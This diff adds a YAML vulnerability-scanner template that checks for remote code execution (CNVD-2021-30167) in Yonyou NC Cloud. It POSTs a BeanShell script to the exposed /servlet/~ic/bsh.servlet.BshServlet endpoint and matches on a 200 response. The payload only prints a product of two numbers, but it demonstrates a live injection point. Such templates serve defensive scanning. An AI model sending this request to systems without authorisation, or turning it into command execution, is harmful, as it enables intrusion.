@@ -1,0 +1,21 @@
+id: yaml-poc-yonyou-yonyou_nc_cloud-rce-CNVD-2021-30167
+info:
+  name: Yaml Poc Yonyou Yonyou_Nc_Cloud Rce Cnvd 2021 30167
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-yonyou-yonyou_nc_cloud-rce-CNVD-2021-30167'
+  tags: rce
+  reference: []
+http:
+- method: POST
+  path:
+  - /servlet/~ic/bsh.servlet.BshServlet
+  body: bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
